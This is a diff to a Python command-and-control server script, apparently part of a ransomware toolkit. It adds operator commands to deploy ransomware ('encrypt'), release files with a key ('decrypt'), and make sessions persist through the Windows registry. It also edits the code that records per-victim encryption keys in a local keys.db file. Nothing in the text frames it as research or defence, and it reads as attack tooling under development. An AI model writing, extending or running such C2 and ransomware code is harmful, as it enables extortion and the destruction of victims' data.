@@ -35,11 +35,17 @@ def help():
 
     print('''
                 Available Commands:
+                    In C2 Console:
                                     help:Show this help menu.
                                     list:Lists connected hosts, along with the session id.
                                     use <id>:Open a shell session with a selected host.
                                     quit:Exit the program.
                                     remove <id>:Forcibly removes a dead socket(Do Not try on live connections!)
+                    In shell Console:
+                                    encrypt:deploys ransomeware
+                                    decrypt <key>:decrypts the files
+                                    persistence:Makes the session persistant by writing to the windows registry
+                                    
                 ''')
 
 def colored(r, g, b, text):
@@ -99,7 +105,7 @@ def C2():
             elif CMD == "list":
                 listhosts()
             elif CMD == "clear" or CMD == "cls":
-                os.system("cls")
+                os.system("clear")
         
             else:
                 print(CMD+"[+]Invalid Command.Try typing 'help'")
@@ -129,27 +135,29 @@ def C2():
                     shell = False
                     break
                 elif CMD == "cls" or CMD == "clear":
-                    os.system("cls")
+                    os.system("clear")
                 elif CMD == "encrypt":
-                    key = victim_sockets[index].recv(BUFFER).decode()
+                    key = output#victim_sockets[index].recv(BUFFER).decode()
                     fout = open("keys.db",'a')
                     fout.write(victim_host[index]+","+key+'\n')
                     fout.close()
                 elif splitted_cmd[0] == "decrypt":
-                    fin = open("keys.db","r")
+                    key = splitted_cmd[1]
+                    '''fin = open("keys.db","r")
                     db = fin.read().split(',')
                     i = db.index(victim_host[index])
-                    key = db[i+1]
+                    key = db[i+1]'''
+                    print(key)
                     #key = splitted_cmd[1]
-                    victim_sockets[index].send(key.encode())
+                    #victim_sockets[index].send(key.encode())
 
-                    db.remove(key)
+                    '''db.remove(key)
                     db.remove(i)
                     
                     f = open("keys.db","w")
                     for i in range(0,len(db),2):
                         f.write(db[i]+','+db[i+1]+'\n')
-                    f.close()
+                    f.close()'''
 
 print_banner()
 help()
